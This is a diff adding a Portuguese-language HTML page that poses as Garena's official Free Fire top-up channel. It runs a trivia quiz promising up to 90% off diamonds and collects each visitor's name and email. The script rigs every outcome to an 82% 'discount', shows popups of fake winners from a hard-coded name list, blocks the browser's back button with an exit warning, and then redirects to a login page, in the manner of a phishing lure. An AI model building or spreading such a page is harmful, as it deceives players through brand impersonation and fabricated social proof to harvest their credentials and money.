@@ -1,0 +1,680 @@
+﻿<!DOCTYPE html><html lang="pt-BR">
+
+<head><meta charset="UTF-8"><head>
+    <link rel="stylesheet" href="style.html">
+    
+<!-- Meta Pixel Code -->
+<script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    '../../connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '554379850885356');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none" src="tr?id=554379850885356&amp;ev=PageView&amp;noscript=1"></noscript>
+    <!-- End Meta Pixel Code -->
+
+    <!-- Meta Pixel Code -->
+<script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    '../../connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '554379850885356');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none" src="tr?id=554379850885356&amp;ev=PageView&amp;noscript=1"></noscript>
+    <!-- End Meta Pixel Code -->
+
+<script>
+  window.pixelId = "6889f716764326f48e007c2a";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<style>
+/* Reset e base com vibe gamer */
+@import url('css2');
+
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+  font-family: 'Roboto', sans-serif;
+  scroll-behavior: smooth;
+}
+
+body {
+  background: linear-gradient(180deg, #0f0f0f, #1a1a1a);
+  color: #f0f0f0;
+  padding: 10px;
+  line-height: 1.6;
+  font-size: 16px;
+}
+
+/* Top bar */
+.top-bar {
+  display: flex;
+  align-items: center;
+  background: #111;
+  border-bottom: 2px solid #ff0040;
+  padding: 10px 12px;
+  height: 60px;
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  z-index: 1000;
+  width: 100%;
+  box-shadow: 0 2px 8px #ff004033;
+}
+
+.top-bar img {
+  height: 48px;
+}
+
+.separator {
+  width: 2px;
+  height: 20px;
+  background: #ff0040;
+  margin: 0 12px;
+}
+
+.top-text {
+  color: #eee;
+  font-size: 13px;
+  display: flex;
+  flex-direction: column;
+  line-height: 1.3;
+  text-shadow: 0 0 4px #ff0040;
+}
+
+.right-logo {
+  margin-left: auto;
+}
+
+.right-logo img {
+  height: 30px;
+}
+
+/* Container */
+.container {
+  max-width: 540px;
+  margin: 80px auto 0;
+  text-align: center;
+  padding: 0 10px;
+}
+
+/* Botões */
+button {
+  background: linear-gradient(45deg, #ff0040, #ff9900);
+  border: none;
+  padding: 14px 26px;
+  margin-top: 20px;
+  font-size: 18px;
+  cursor: pointer;
+  border-radius: 12px;
+  color: white;
+  font-weight: bold;
+  transition: all 0.3s ease;
+  text-transform: uppercase;
+  box-shadow: 0 0 12px #ff0040aa;
+}
+
+button:hover {
+  background: linear-gradient(45deg, #cc0033, #e68a00);
+  transform: scale(1.07);
+  box-shadow: 0 0 16px #ff0040cc;
+}
+
+/* Inputs */
+input, select {
+  padding: 14px;
+  margin: 12px 0;
+  width: 100%;
+  border-radius: 10px;
+  border: 1px solid #ff0040;
+  background-color: #222;
+  color: #fff;
+  font-size: 16px;
+  text-align: center;
+}
+
+/* Card 3D e Resultado */
+.card-3d,
+#result-screen.card-3d {
+  background: linear-gradient(135deg, #1f1f1f, #292929);
+  padding: 35px 24px;
+  border-radius: 18px;
+  box-shadow: 0 0 20px #ff004033;
+  transform: perspective(1000px) rotateX(1deg) rotateY(-1deg);
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+  color: #fff;
+  text-align: center;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  min-height: 420px;
+  margin: auto;
+}
+
+.card-3d:hover {
+  transform: perspective(1000px) rotateX(0deg) rotateY(0deg);
+  box-shadow: 0 0 25px #ff0040aa;
+}
+
+.quiz-box {
+  background: #2a2a2a;
+  border-radius: 16px;
+  padding: 28px;
+  margin-bottom: 30px;
+  box-shadow: 0 0 10px #00000066;
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+
+.quiz-box:hover {
+  transform: translateY(-4px);
+  box-shadow: 0 0 20px #ff004066;
+}
+
+.option {
+  background: #1f1f1f;
+  color: #fff;
+  padding: 16px;
+  margin: 12px 0;
+  border-radius: 12px;
+  cursor: pointer;
+  transition: transform 0.2s ease, box-shadow 0.2s ease;
+  box-shadow: 0 0 10px rgba(255, 0, 64, 0.2);
+}
+
+.option:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 0 20px rgba(255, 0, 64, 0.4);
+}
+
+.option.correta {
+  background-color: #00cc66;
+  color: #fff;
+  box-shadow: 0 0 20px #00cc66aa;
+  transform: scale(1.02);
+}
+
+.option.errada {
+  background-color: #d81a0d;
+  color: #fff;
+  box-shadow: 0 0 20px rgba(216, 26, 13, 0.5);
+  transform: scale(1.02);
+}
+
+/* Progresso */
+.progress-bar {
+  width: 100%;
+  margin-top: 20px;
+  align-self: flex-start;
+}
+
+.progress-fill {
+  height: 26px;
+  width: 0%;
+  background: linear-gradient(90deg, #ff0040, #ffa200);
+  transition: width 0.5s ease-in-out;
+  text-align: center;
+  color: #fff;
+  line-height: 26px;
+  font-weight: bold;
+  border-radius: 12px;
+  box-shadow: 0 0 8px rgba(255, 0, 64, 0.4);
+  animation: pulseBar 2s infinite ease-in-out;
+}
+
+.final-image {
+  max-width: 100%;
+  margin-bottom: 20px;
+  border-radius: 12px;
+  animation: fadeSlide 1.2s ease-out;
+  transform: scale(1);
+}
+
+.popup-message {
+  background: #222;
+  color: #ff0040;
+  padding: 12px 24px;
+  border-radius: 10px;
+  font-size: 15px;
+  box-shadow: 0 0 12px #ff0040;
+  animation: fadeInOut 5s ease-in-out;
+}
+
+footer {
+  margin-top: 40px;
+  padding: 20px 10px;
+  text-align: center;
+  color: #888;
+  font-size: 14px;
+}
+
+footer a {
+  text-decoration: none;
+  color: #ffcc00;
+}
+
+footer a:hover {
+  text-decoration: underline;
+}
+
+.hidden {
+  display: none !important;
+  visibility: hidden;
+  opacity: 0;
+}
+
+.pulsante {
+  animation: pulse 1.8s infinite;
+}
+
+.desconto-titulo {
+  text-align: center;
+  font-weight: bold;
+  color: #ff0040;
+  margin-bottom: 8px;
+  font-size: 17px;
+  animation: pulse-brilho 1.5s infinite;
+  text-shadow: 0 0 5px #ff0040, 0 0 10px #ff0040;
+}
+
+img {
+  max-width: 100%;
+  height: auto;
+  border-radius: 10px;
+  margin: 20px 0;
+}
+#exit-warning {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-color: rgba(0, 0, 0, 0.7);
+  z-index: 9999;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  display: none;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(20px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+@keyframes fadeInOut {
+  0% { opacity: 0; transform: translateY(20px); }
+  10% { opacity: 1; transform: translateY(0); }
+  90% { opacity: 1; transform: translateY(0); }
+  100% { opacity: 0; transform: translateY(20px); }
+}
+
+@keyframes fadeSlide {
+  0% { opacity: 0; transform: translateY(30px) scale(0.95); }
+  60% { opacity: 1; transform: translateY(-5px) scale(1.02); }
+  100% { transform: translateY(0) scale(1); }
+}
+
+@keyframes pulse {
+  0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 64, 0.7); }
+  70% { transform: scale(1.05); box-shadow: 0 0 15px 10px rgba(255, 0, 64, 0); }
+  100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 64, 0); }
+}
+
+@keyframes pulse-brilho {
+  0%   { transform: scale(1); text-shadow: 0 0 5px #ff0040; }
+  50%  { transform: scale(1.05); text-shadow: 0 0 15px #ff0040; }
+  100% { transform: scale(1); text-shadow: 0 0 5px #ff0040; }
+}
+
+</style>
+<meta http-equiv="X-Frame-Options" content="DENY">
+    <link rel="icon" type="image/x-icon" href="images/icon.ico">
+  <meta charset="UTF-8">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#151515">
+  <title>Desafio Free Fire</title>
+</head>
+<body>
+    
+ <audio id="background-music" loop="">
+    <source src="media/itachi.mp3" type="audio/mpeg">
+    Seu navegador não suporta o elemento de áudio.
+</audio>
+
+    <script>
+        
+     // Reproduz música de fundo após interação
+    const music = document.getElementById('background-music');
+    music.volume = 0.2; // Define o volume inicial para 50%
+
+    document.body.addEventListener('click', function playMusicOnce() {
+        music.play().catch(error => {
+            console.log("Erro ao tentar reproduzir o áudio:", error);
+        });
+        document.body.removeEventListener('click', playMusicOnce);
+    });
+
+</script>
+    <script src="js/confetti.browser.min.js"></script>
+    <div id="popup-acerto" class="popup-gif hidden">
+  <img src="images/gifacerto.gif" alt="Acertou!">
+</div>
+
+  <div class="top-bar">
+    <img src="images/garena-logo.png" alt="Garena Logo">
+    <div class="separator"></div>
+    <div class="top-text">
+      <span>Canal Oficial de</span>
+      <span>Recarga</span>
+    </div>
+    
+    <div class="right-logo">
+    <img src="images/perfil.svg" alt="Nova Logo">
+  </div>
+  </div>
+  
+ <div class="container">
+  <div id="lead-screen" class="card-3d">
+    <!-- Imagem com borda arredondada e efeito 3D -->
+    <div class="image-container">
+      <img src="images/bvv.png" alt="Imagem do desafio" class="image-3d">
+    </div>
+
+    <br>Participe do nosso desafio e garanta até<strong>90% de desconto em diamantes e itens raros</strong>basta acertar o maior número de perguntas que conseguir, quanto mais acertar, maior o desconto!<br>
+    <br><strong style="color: #5b5b5b">*Permitido apenas um resgate por e-mail*</strong><br>
+    
+    <!-- Campos do formulário -->
+    <input type="text" id="name" placeholder="Seu nome" required="">
+    <input type="email" id="email" placeholder="Seu e-mail" required="">
+    <button onclick="startQuiz()">Começar Desafio</button>
+  </div>
+</div>
+
+    <div id="quiz-screen" class="hidden">
+  <div class="quiz-box">
+    <h2 id="question-title"></h2>
+    <div id="options"></div>
+  </div>
+  <div class="desconto-titulo">🎯 Desconto acumulado</div>
+  <div class="progress-bar">
+    <div id="progress-fill" class="progress-fill">0%</div>
+  </div>
+</div>
+
+    <div id="result-screen" class="hidden card-3d">
+      <img src="images/FINAL3.png" alt="Diamantes" class="final-image">
+       <p>Você conquistou <strong>82% de desconto</strong> em mais de 5.600 diamantes, além de acesso a itens raros que não estão disponíveis na loja do jogo!</p>
+       <p><strong>Clique no botão e garanta!</strong></p>
+      <button class="pulsante">Resgatar Desconto</button>
+    </div>
+
+    <footer>
+      <p>© Garena Online. Todos os direitos reservados.</p>
+      <div style="border-top: 1px solid #ccc; margin: 10px 0;"></div>
+      <p>
+        <a href="https://ffsuporte.garena.com/support/home" target="_blank">FAQ</a> |
+        <a href="https://content.garena.com/legal/tos/tos_pt.html" target="_blank">Termos e condições</a> |
+        <a href="https://content.garena.com/legal/pp/pp_pt.html" target="_blank">Política de privacidade</a>
+      </p>
+    </footer>
+
+  <div id="popup-container" style="position: fixed; bottom: 20px; left: 20px; z-index: 1000;"></div>
+  
+  <audio id="sound-correct" src="media/correto.mp3"></audio>
+  <audio id="sound-wrong" src="media/answer-wrong.mp3"></audio>
+
+  <script>
+const questions = [
+    { question: "Qual é a raridade da skin 'Hip Hop' no Free Fire?", options: ["Comum", "Épica", "Lendária", "Rara"], answer: 2 },
+{ question: "Qual desses modos NÃO existe no Free Fire?", options: ["Contra Squad", "Battle Royale", "Zumbi Invasor", "Corrida Mortal"], answer: 3 },
+{ question: "Quem é o mascote robótico com habilidade de escudo?", options: ["Shiba", "Ottero", "Robo", "Dreki"], answer: 2 },
+{ question: "Qual é o nome da moeda usada no Free Fire?", options: ["Gem", "Gold", "Token", "Diamante"], answer: 3 },
+{ question: "Em que ano o Free Fire foi lançado oficialmente?", options: ["2016", "2017", "2018", "2019"], answer: 1 },
+  { question: "Qual é o nome do mapa mais famoso do Free Fire?", options: ["Erangel", "Miramar", "Bermuda", "Purgatório"], answer: 2 },
+  { question: "Qual personagem tem a habilidade 'Drop the Beat'?", options: ["DJ Alok", "Hayato", "Kelly", "Chrono"], answer: 0 },
+  { question: "Quantos jogadores participam de uma partida ranqueada solo?", options: ["75", "100", "50", "52"], answer: 2 },
+  { question: "Qual dessas armas é do tipo 'sniper' no Free Fire?", options: ["M1014", "AWM", "MP40", "FAMAS"], answer: 1 },
+  { question: "Qual veículo pode ser usado no mapa Bermuda?", options: ["Hélicoptero", "Jet ski", "Tanque", "Carro Esportivo"], answer: 3 }
+];
+
+let currentQuestion = 0;
+let totalDesconto = 0;
+const descontoMaximo = 82; // Desconto final garantido
+const incrementoMaximo = Math.floor(descontoMaximo / questions.length); // Calcula o aumento gradual por pergunta
+
+function startQuiz() {
+  const name = document.getElementById("name").value.trim();
+  const email = document.getElementById("email").value.trim();
+
+  if (!name || !email) {
+    alert("Por favor, preencha seu nome e e-mail antes de começar.");
+    return;
+  }
+
+  // Remove visualmente o container da VSL
+  const vslElement = document.getElementById("vid_6809275b6f8f4b5452b79b89");
+  if (vslElement) vslElement.remove();
+
+  // 🔇 Tenta parar todos os vídeos e iframes
+  document.querySelectorAll("video").forEach(video => {
+    video.pause();
+    video.currentTime = 0;
+  });
+
+  document.querySelectorAll("iframe").forEach(iframe => {
+    iframe.src = "";
+  });
+
+  // Esconde a tela de lead e mostra o quiz
+  document.getElementById("lead-screen").classList.add("hidden");
+  document.getElementById("quiz-screen").classList.remove("hidden");
+
+  loadQuestion();
+}
+
+function loadQuestion() {
+  const q = questions[currentQuestion];
+  document.getElementById("question-title").textContent = q.question;
+  const optionsDiv = document.getElementById("options");
+  optionsDiv.innerHTML = "";
+
+  q.options.forEach((option, index) => {
+    const div = document.createElement("div");
+    div.className = "option";
+    div.textContent = option;
+
+    div.addEventListener("click", () => {
+      // Se já acertou, não faz mais nada
+      if (div.classList.contains("correta")) return;
+
+      const correct = questions[currentQuestion].answer === index;
+      const sound = document.getElementById(correct ? "sound-correct" : "sound-wrong");
+      sound.play();
+
+      if (correct) {
+        div.classList.add("correta");
+
+        // Desabilita todos os botões
+        const allOptions = document.querySelectorAll('.option');
+        allOptions.forEach(btn => {
+          btn.style.pointerEvents = "none";
+        });
+
+        showPopupAcerto();
+
+        // 🎯 Aumento de desconto aleatório e controlado
+if (currentQuestion < questions.length - 1) {
+  const perguntasRestantes = questions.length - currentQuestion - 1;
+  const aumentoRestante = descontoMaximo - 82; // Reserva 10% para o final
+  const aumentoLimite = Math.floor((82 - totalDesconto) / perguntasRestantes);
+
+  const aumentoAleatorio = Math.floor(Math.random() * (aumentoLimite - 5 + 1)) + 5;
+  totalDesconto += aumentoAleatorio;
+
+  showPopup(`🎁 Você ganhou +${aumentoAleatorio}% de desconto!`);
+  document.getElementById("progress-fill").style.width = totalDesconto + "%";
+  document.getElementById("progress-fill").textContent = totalDesconto + "%";
+}
+
+currentQuestion++;
+setTimeout(() => {
+  if (currentQuestion < questions.length) {
+    loadQuestion();
+  } else {
+    // Finaliza com 90%
+    totalDesconto = descontoMaximo;
+    document.getElementById("quiz-screen").classList.add("hidden");
+    document.getElementById("result-screen").classList.remove("hidden");
+    document.querySelector("#result-screen p strong").textContent = `${totalDesconto}% de desconto`;
+
+    // Atualiza barra de progresso final
+    document.getElementById("progress-fill").style.width = totalDesconto + "%";
+    document.getElementById("progress-fill").textContent = totalDesconto + "%";
+
+    showConfettiFinal();
+  }
+}, 2500);
+      } else {
+        // Aplica classe de erro temporariamente
+        div.classList.add("errada");
+        showPopup("❌ Resposta errada! Tente novamente.");
+
+        setTimeout(() => {
+          div.classList.remove("errada");
+        }, 1200);
+      }
+    });
+
+    optionsDiv.appendChild(div);
+  });
+}
+
+function showConfettiFinal() {
+  const duration = 2 * 1000;
+  const end = Date.now() + duration;
+
+  (function frame() {
+    confetti({
+      particleCount: 5,
+      angle: 60,
+      spread: 55,
+      origin: { x: 0 },
+      colors: ['#ff0000', '#00ff00', '#0000ff'],
+    });
+    confetti({
+      particleCount: 5,
+      angle: 120,
+      spread: 55,
+      origin: { x: 1 },
+      colors: ['#ff0000', '#00ff00', '#0000ff'],
+    });
+
+    if (Date.now() < end) {
+      requestAnimationFrame(frame);
+    }
+  })();
+}
+
+function showPopup(message) {
+  const container = document.getElementById("popup-container");
+  const popup = document.createElement("div");
+  popup.className = "popup-message";
+  popup.textContent = message;
+  container.appendChild(popup);
+  setTimeout(() => popup.remove(), 5000);
+}
+
+function showPopupAcerto() {
+  const popupGif = document.createElement("div");
+  popupGif.className = "popup-gif";
+  popupGif.style.position = "fixed";
+  popupGif.style.top = "20%";
+  popupGif.style.left = "50%";
+  popupGif.style.transform = "translateX(-50%)";
+  popupGif.style.zIndex = "2000";
+  popupGif.innerHTML = `
+    <img src="images/gifacerto.gif" alt="Acertou!" style="width: 250px; border-radius: 12px;" />
+  `;
+  document.body.appendChild(popupGif);
+
+  // Remover gif depois de 2.5s
+  setTimeout(() => popupGif.remove(), 2500);
+}
+
+// 🧲 Popup automático de pessoas ganhando desconto fake
+const nomesFake = ["Lucas R.", "Ana M.", "João S.", "Camila D.", "Pedro T.", "Marina F.", "Gustavo V.", "Isabela N."];
+function gerarPopupFake() {
+  const nome = nomesFake[Math.floor(Math.random() * nomesFake.length)];
+  const descontoFake = Math.floor(Math.random() * (85 - 32 + 1)) + 32; // Entre 32% e 85%
+  showPopup(`🎉 ${nome} acabou de ganhar ${descontoFake}% de desconto!`);
+}
+setInterval(gerarPopupFake, 12000); // a cada 8 segundos
+
+// 🚀 Redirecionar ao clicar no botão
+document.querySelector("#result-screen button").addEventListener("click", () => {
+  window.location.href = 'login.html/index.html' + window.location.search;
+});
+
+</script>
+
+<!-- Popup visual de saída -->
+<div id="exit-warning">
+  <div class="popup">
+    <h3>Deseja mesmo sair?</h3>
+    <p>Você pode perder seu desconto exclusivo se continuar!</p>
+    <div class="btns">
+      <button class="cancelar" onclick="cancelarSaida()">Ficar</button>
+      <button class="sair" onclick="confirmarSaida()">Sair</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  let bloqueandoSaida = true;
+
+  history.pushState(null, null, location.href);
+
+  window.addEventListener('popstate', function () {
+    if (bloqueandoSaida) {
+      document.getElementById('exit-warning').style.display = 'flex';
+      history.pushState(null, null, location.href);
+    }
+  });
+
+  function cancelarSaida() {
+    document.getElementById('exit-warning').style.display = 'none';
+  }
+
+  function confirmarSaida() {
+    bloqueandoSaida = false;
+    history.back();
+  }
+</script>
+
+<script src="scripts/utms/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+</body>
+
+</head></html>
